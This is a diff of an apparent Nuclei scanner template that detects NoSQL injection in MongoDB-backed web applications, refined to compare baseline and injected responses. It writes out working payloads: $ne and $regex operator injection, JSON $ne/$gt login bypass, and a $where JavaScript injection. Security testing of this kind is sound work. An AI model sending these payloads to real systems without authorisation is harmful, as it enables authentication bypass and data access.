@@ -5,10 +5,10 @@ info:
   author: achraf-chehboun
   severity: high
   description: |
-    Detects NoSQL injection vulnerabilities in MongoDB and CouchDB-backed applications.
-    Tests for operator injection ($gt, $ne, $regex, $where), JSON injection in REST APIs,
-    and JavaScript injection in server-side evaluation. Uses non-destructive detection —
-    only read-based operations are tested, no data modification occurs.
+    Detects NoSQL injection in MongoDB-backed applications. Uses baseline comparisons:
+    normal login first, then operator injection. Only flags if the injection response
+    differs meaningfully from a normal failed login. Requires JSON content-type for
+    API tests and differential responses for URL parameter tests.
   reference:
     - https://owasp.org/Top10/A03_2021-Injection/
     - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
@@ -17,77 +17,89 @@ info:
     cvss-score: 9.1
     cwe-id: CWE-943
   metadata:
-    max-request: 8
+    max-request: 10
   tags: owasp-top10,injection,nosql,mongodb,detection-only
 
 http:
-  # Test 1: MongoDB operator injection via URL parameters
+  # URL operator injection: baseline normal login vs $ne injection
   - raw:
       - |
-        GET /?username[$ne]=impossible&password[$ne]=impossible HTTP/1.1
+        GET /?username=xnlbz_impossible_user&password=xnlbz_impossible_pass HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?username[$ne]=xnlbz_impossible_user&password[$ne]=xnlbz_impossible_pass HTTP/1.1
         Host: {{Hostname}}
         Accept: text/html
 
-    matchers-condition: and
+    req-condition: true
     matchers:
-      - type: status
-        status:
-          - 200
-          - 302
-
       - type: dsl
-        name: nosql-operator-injection
+        name: nosql-ne-operator-bypass
         dsl:
-          - '!contains(body, "invalid") && !contains(body, "error") && !contains(body, "unauthorized") && !contains(body, "login") && len(body) > 100'
+          - 'status_code_2 == 200 && status_code_1 != 200 && status_code_2 != status_code_1'
+          - 'status_code_2 == 302 && status_code_1 != 302 && !contains(header_1, "Location") && contains(header_2, "Location")'
+        condition: or
 
-  # Test 2: MongoDB $regex operator injection
+  # $regex operator: baseline vs regex injection
   - raw:
+      - |
+        GET /?username=xnlbz_impossible_user&password=xnlbz_impossible_pass HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
       - |
         GET /?username[$regex]=.*&password[$regex]=.* HTTP/1.1
         Host: {{Hostname}}
         Accept: text/html
 
-    matchers-condition: and
+    req-condition: true
     matchers:
-      - type: status
-        status:
-          - 200
-          - 302
-
       - type: dsl
-        name: nosql-regex-injection
+        name: nosql-regex-bypass
         dsl:
-          - '!contains(body, "invalid") && !contains(body, "error") && !contains(body, "login") && len(body) > 100'
+          - 'status_code_2 != status_code_1 && (status_code_2 == 200 || status_code_2 == 302)'
+          - 'status_code_2 == 200 && len(body_2) > len(body_1) * 2 && len(body_2) > 200'
+        condition: or
 
-  # Test 3: JSON body NoSQL injection
+  # JSON body injection: normal failed login vs $ne injection
   - raw:
       - |
-        POST /api/login HTTP/1.1
+        POST {{BaseURL}}/api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"username":"xnlbz_impossible_user","password":"xnlbz_impossible_pass"}
+      - |
+        POST {{BaseURL}}/api/login HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
         Accept: application/json
 
         {"username":{"$ne":""},"password":{"$ne":""}}
       - |
-        POST /api/login HTTP/1.1
+        POST {{BaseURL}}/api/login HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
         Accept: application/json
 
         {"username":{"$gt":""},"password":{"$gt":""}}
 
-    stop-at-first-match: true
-    matchers-condition: or
+    req-condition: true
     matchers:
       - type: dsl
         name: json-nosql-auth-bypass
         dsl:
-          - 'status_code_1 == 200 && (contains(body_1, "token") || contains(body_1, "session") || contains(body_1, "success"))'
-          - 'status_code_2 == 200 && (contains(body_2, "token") || contains(body_2, "session") || contains(body_2, "success"))'
+          - '(status_code_1 == 401 || status_code_1 == 403 || status_code_1 == 422) && status_code_2 == 200 && contains(content_type_2, "json") && (contains(body_2, "token") || contains(body_2, "session") || contains(body_2, "success") || contains(body_2, "user"))'
+          - '(status_code_1 == 401 || status_code_1 == 403 || status_code_1 == 422) && status_code_3 == 200 && contains(content_type_3, "json") && (contains(body_3, "token") || contains(body_3, "session") || contains(body_3, "success") || contains(body_3, "user"))'
         condition: or
 
-  # Test 4: MongoDB $where JavaScript injection
+  # $where JavaScript injection: differential test
   - raw:
+      - |
+        GET /?search=xnlbz_baseline HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
       - |
         GET /?search=1;return%20true HTTP/1.1
         Host: {{Hostname}}
@@ -102,9 +114,9 @@ http:
       - type: dsl
         name: where-js-injection
         dsl:
-          - 'status_code_1 == 200 && status_code_2 == 200 && len(body_1) != len(body_2) && (len(body_1) - len(body_2) > 100 || len(body_2) - len(body_1) > 100)'
+          - 'status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200 && len(body_2) != len(body_3) && (len(body_2) - len(body_3) > 200 || len(body_3) - len(body_2) > 200) && body_1 != body_2'
 
-  # Test 5: MongoDB error detection (confirms MongoDB backend)
+  # MongoDB error detection (confirms MongoDB backend)
   - raw:
       - |
         GET /?id=1'%22%5C HTTP/1.1
@@ -120,7 +132,7 @@ http:
           - '(?i)MongoDB.*?Error'
           - '(?i)Mongo\..*?Exception'
           - '(?i)com\.mongodb'
-          - '(?i)mongoose.*?error'
+          - '(?i)mongoose.*?(?:Cast|Validation)?Error'
           - '(?i)CastError.*?ObjectId'
           - '(?i)BSONTypeError'
         condition: or
